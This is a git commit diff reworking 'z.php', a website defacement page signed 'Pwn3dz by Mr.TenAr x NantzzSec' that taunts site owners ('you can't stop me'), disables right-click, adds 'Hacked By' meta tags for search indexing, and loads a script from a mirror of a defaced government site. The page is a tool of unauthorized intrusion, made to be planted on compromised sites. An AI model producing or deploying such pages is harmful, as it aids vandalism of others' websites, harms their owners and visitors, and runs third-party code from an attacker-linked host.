5159a30770a93b66e24a4b83591698b1d128e3cc
Tengku Arya Saputra <33353823+AryaSec1337@users.noreply.github.com>
2025-04-18 07:20:38 +0700

    Update z.php

--- z.php
+++ z.php
@@ -1,66 +1,83 @@
-
-<html>
+<!DOCTYPE html>
+<html lang="en">
 
 <head>
-	<title>Pwnd by Mr.TenAr</title>
-	<link rel="icon" type="image/png" href="https://c.top4top.io/p_20661mc0d0.png">
-	<meta property="og:image" content="https://c.top4top.io/p_20661mc0d0.pngg" />
-	<meta name="description" content="<3">
-	<meta charset="utf-8">
-	<style>
-		html,
-		body {
-			color: white;
-			font-family: 'Fredericka the Great', sans-serif;
-			font-weight: 100;
-			height: 100vh;
-			margin: 0
-		}
+  <title>Pwn3dz by Mr.TenAr x NantzzSec</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Hacked By Mr.TenAr x NantzzSec">
+  <meta name="keywords" content="Hacked By Mr.TenAr x NantzzSec">
+  <meta name="author" content="Hacked By Mr.TenAr x NantzzSec">
+  <meta name="robots" content="index, follow">
 
-		.full-height {
-			height: 100vh
-		}
+  <!-- Open Graph Tags -->
+  <meta property="og:title" content="Pwnd by Mr.TenAr">
+  <meta property="og:description" content="Hacked By Mr.TenAr">
+  <meta property="og:image" content="https://c.top4top.io/p_20661mc0d0.png">
+  <meta property="og:type" content="website">
 
-		.flex-center {
-			align-items: center;
-			display: flex;
-			justify-content: center
-		}
+  <link rel="icon" type="image/png" href="https://c.top4top.io/p_20661mc0d0.png">
+  <style>
+    html,
+    body {
+      color: white;
+      font-family: 'Fredericka the Great', sans-serif;
+      font-weight: 100;
+      height: 100vh;
+      margin: 0;
+      background-color: black;
+    }
 
-		.position-ref {
-			position: relative
-		}
+    .full-height {
+      height: 100vh;
+    }
 
-		.content {
-			text-align: center
-		}
+    .flex-center {
+      align-items: center;
+      display: flex;
+      justify-content: center;
+    }
 
-		.title {
-			font-size: 36px;
-			padding: 20px
-		}
-	</style>
+    .position-ref {
+      position: relative;
+    }
+
+    .content {
+      text-align: center;
+    }
+
+    .title {
+      font-size: 36px;
+      padding: 20px;
+    }
+  </style>
 </head>
+
 <style type='text/css'>
-	body,
-	a:hover {
-		cursor: url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important;
-	}
+  body,
+  a:hover {
+    cursor: url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important;
+  }
 </style>
 
-<body align="center" oncontextmenu="return false" bgcolor="black">
-	<div class="stars">
-		<div class="twinkling">
-			<div class="flex-center position-ref full-height">
-				<div class="content">
-					<div class="text">
-						<font color="#00000">
-							<img src="https://c.top4top.io/p_20661mc0d0.png" width="450px" heigt="450px">
-							<br> <br>
-							<font size="5" style="color: white;">
-								<b><i><code>&hearts; Pwn3dz By Mr.TenAr x NantzzSec &hearts; </font>
-		 	 				 <br><br><h2 style="color: white;">~ I'm back to test how big your security force is, you can't stop me. ~<h2><br>
-                                <h2 style="color: white;">~ We Are Dark Clown Security ~<h2><br>
-			<script type="text/javascript" src="http://zonehmirrors.org/defaced/2020/06/23/ardma.midanuttalim.com/suhunan.sukabumikab.go.id/sakura.js"></script>
-		 	 				</body>
-		 	 				 </html>
+<body align="center" oncontextmenu="return false">
+  <div class="stars">
+    <div class="twinkling">
+      <div class="flex-center position-ref full-height">
+        <div class="content">
+          <img src="https://c.top4top.io/p_20661mc0d0.png" width="450px" height="450px">
+          <br><br>
+          <div style="color: white; font-size: 20px;">
+            <b><i>&hearts; Pwn3dz By Mr.TenAr x NantzzSec &hearts;</i></b>
+            <br><br>
+            <h2>~ I'm back to test how big your security force is, you can't stop me. ~</h2>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script type="text/javascript" src="https://zonehmirrors.org/defaced/2020/06/23/ardma.midanuttalim.com/suhunan.sukabumikab.go.id/sakura.js"></script>
+</body>
+
+</html>
